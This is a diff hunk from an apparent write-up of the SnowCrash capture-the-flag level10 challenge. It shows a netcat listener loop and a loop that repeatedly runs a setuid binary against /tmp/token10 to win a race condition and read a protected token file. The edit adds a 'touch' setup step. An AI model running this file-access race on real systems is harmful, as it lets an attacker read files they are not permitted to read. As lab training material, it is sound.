@@ -58,7 +58,8 @@ level10@SnowCrash:~$ while :; do nc -l 6969; done
 .*( )*.
 
 # VM 2 run
-while :; do nice -n 20 ./level10 /tmp/token10 127.0.0.1; done	# Note nice it to to lower the priority as low as possible
+level10@SnowCrash:~$ touch /tmp/token10
+level10@SnowCrash:~$ while :; do nice -n 20 ./level10 /tmp/token10 127.0.0.1; done	# Note nice it to to lower the priority as low as possible
 Connecting to 127.0.0.1:6969 .. Connected!
 Sending file .. wrote file!
 
